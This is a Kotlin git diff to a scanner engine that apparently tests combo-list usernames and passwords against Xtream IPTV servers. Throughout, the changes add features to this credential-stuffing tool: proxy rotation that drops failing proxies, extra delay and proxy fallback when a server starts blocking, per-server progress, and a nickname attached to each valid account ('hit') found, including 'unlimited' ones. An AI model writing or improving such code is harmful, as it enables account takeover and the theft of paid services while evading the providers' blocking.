@@ -36,7 +36,8 @@ class ScannerEngine {
         mode: AtkMode,
         proxies: List<String> = emptyList(),
         order: ScanOrder = ScanOrder.SEQUENCIAL,
-        comboMode: ComboMode = ComboMode.FILA
+        comboMode: ComboMode = ComboMode.FILA,
+        nick: String = ""
     ) {
         stop()
         stopped.set(false)
@@ -57,16 +58,19 @@ class ScannerEngine {
         val startMs = System.currentTimeMillis()
         val proxyIdx = AtomicInteger(0)
         val serverHits = ConcurrentHashMap<String, AtomicInteger>()
+        val serverChecks = ConcurrentHashMap<String, AtomicInteger>()
         val serverState = ConcurrentHashMap<String, String>()
         val serverDetail = ConcurrentHashMap<String, String>()
         val useProxyFor = ConcurrentHashMap<String, Boolean>()
         val consecutiveTo = ConcurrentHashMap<String, AtomicInteger>()
         val alive200 = ConcurrentHashMap<String, Boolean>()
+        val badProxies = ConcurrentHashMap<String, AtomicInteger>()
         val stateMutex = Mutex()
 
         val hosts = servers.map { XtreamApi.normServer(it) }.distinct()
         hosts.forEach {
             serverHits[it] = AtomicInteger(0)
+            serverChecks[it] = AtomicInteger(0)
             serverState[it] = if (order == ScanOrder.PARALELO) "SCAN" else "WAIT"
             serverDetail[it] = ""
             useProxyFor[it] = false
@@ -107,6 +111,17 @@ class ScannerEngine {
 
         var currentComboLabel = ""
 
+        fun nextProxy(): String? {
+            if (proxies.isEmpty()) return null
+            var tries = 0
+            while (tries < proxies.size) {
+                val p = proxies[proxyIdx.getAndIncrement() % proxies.size]
+                if ((badProxies[p]?.get() ?: 0) < 4) return p
+                tries++
+            }
+            return proxies[proxyIdx.getAndIncrement() % proxies.size]
+        }
+
         fun pushStats() {
             val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
             try {
@@ -128,11 +143,13 @@ class ScannerEngine {
                 )
                 val ranking = hosts.map { h ->
                     val hc = serverHits[h]?.get() ?: 0
+                    val sc = serverChecks[h]?.get() ?: 0
                     val st = when {
                         hc > 0 -> "ON"
                         else -> serverState[h] ?: "..."
                     }
-                    ServerStatus(host = h, state = st, hits = hc, detail = serverDetail[h] ?: "")
+                    val prog = if (totalCreds > 0) sc.toFloat() / totalCreds else 0f
+                    ServerStatus(host = h, state = st, hits = hc, detail = serverDetail[h] ?: "", progress = prog.coerceIn(0f, 1f))
                 }.sortedWith(
                     compareByDescending<ServerStatus> { it.hits }
                         .thenBy { hosts.indexOf(it.host) }
@@ -169,12 +186,11 @@ class ScannerEngine {
                         if (stopped.get()) break
                         while (paused.get() && !stopped.get()) delay(200)
                         if (stopped.get()) break
-                        if (mode.delayMs > 0) delay(mode.delayMs)
+                        val extraDelay = if ((consecutiveTo[server]?.get() ?: 0) > 4) mode.delayMs + 150 else mode.delayMs
+                        if (extraDelay > 0) delay(extraDelay)
 
                         val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
-                        val proxy = if (needPx) {
-                            proxies[proxyIdx.getAndIncrement() % proxies.size]
-                        } else null
+                        val proxy = if (needPx) nextProxy() else null
 
                         var result = XtreamApi.check(
                             server, cred.user, cred.pass,
@@ -195,19 +211,22 @@ class ScannerEngine {
                                     serverDetail[server] = "bloqueio"
                                 }
                             }
-                            val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
-                            result = XtreamApi.check(
-                                server, cred.user, cred.pass,
-                                timeoutSec = mode.timeoutSec.coerceAtMost(5),
-                                proxyUrl = px,
-                                retries = mode.retries
-                            )
+                            val px = nextProxy()
+                            if (px != null) {
+                                result = XtreamApi.check(
+                                    server, cred.user, cred.pass,
+                                    timeoutSec = mode.timeoutSec.coerceAtMost(5),
+                                    proxyUrl = px,
+                                    retries = mode.retries
+                                )
+                            }
                         }
 
                         if (proxy != null && !result.hit && (
                                 result.err.contains("Timeout", true) || result.code == 0
                                 )
                         ) {
+                            badProxies.getOrPut(proxy) { AtomicInteger(0) }.incrementAndGet()
                             val direct = XtreamApi.check(
                                 server, cred.user, cred.pass,
                                 timeoutSec = mode.timeoutSec,
@@ -220,12 +239,13 @@ class ScannerEngine {
                         }
 
                         val n = checks.incrementAndGet()
+                        serverChecks[server]?.incrementAndGet()
                         when {
                             result.hit -> {
                                 consecutiveTo[server]?.set(0)
                                 alive200[server] = true
                                 val hit = XtreamApi.buildHit(
-                                    server, cred.user, cred.pass, result.data, comboName
+                                    server, cred.user, cred.pass, result.data, comboName, nick
                                 )
                                 hits.incrementAndGet()
                                 if (hit.unlimited) unlimited.incrementAndGet()
@@ -331,6 +351,7 @@ class ScannerEngine {
                     serverState[h] = if (order == ScanOrder.PARALELO) "SCAN" else "WAIT"
                 }
                 consecutiveTo[h]?.set(0)
+                serverChecks[h]?.set(0)
             }
             if (order == ScanOrder.PARALELO) {
                 val jobs = hosts.mapIndexed { idx, server ->
